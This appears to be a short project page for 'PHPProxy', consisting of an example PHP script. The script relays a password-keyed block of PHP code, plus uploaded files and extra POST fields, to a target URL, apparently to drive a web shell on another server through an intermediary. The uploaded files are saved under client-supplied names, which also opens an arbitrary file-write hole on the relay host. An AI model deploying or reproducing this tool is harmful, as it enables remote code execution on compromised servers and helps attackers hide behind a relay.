# PHPProxy
例子
<?php
/**
 * Created by PhpStorm.
 * User: abcdlzy
 * Date: 15/2/16
 * Time: 下午7:50
 */

include_once(dirname(__FILE__).'/../DataTransport.php');

@$URL=$_REQUEST['URL'];
@$pass=$_REQUEST['pass'];
@$code=$_REQUEST['code'];
if(!empty($URL)&&!empty($pass)&&!empty($code)){
    $phpcode = trim($code);

    $postArray=array();
    $postArray[$pass]=$phpcode;

    //文件处理
    if(!empty($_FILES)){
        foreach($_FILES as $key=>$value){
            move_uploaded_file($value['tmp_name'], $value['name']);
            $postArray[$key]='@'.realpath($value['name']);
        }
    }

    //处理shell
    foreach($_POST as $key=>$value){
        if($key!='URL'&&$key!='pass'&&$key!='code'){
            $postArray[$key]=$value;
        }
    }

    //获取数据
    DataTransport::go($URL,$postArray);

    //处理数据
    foreach ( preg_split( '/[\r\n]+/', DataTransport::$header ) as $headertext  ) {
        header( $headertext );
    }
    print(DataTransport::$response);

    //删除临时文件
    if(!empty($_FILES)){
        foreach($_FILES as $key=>$value){
            unlink($value['name']);
        }
    }
}
else{
    echo '500';
}



?>
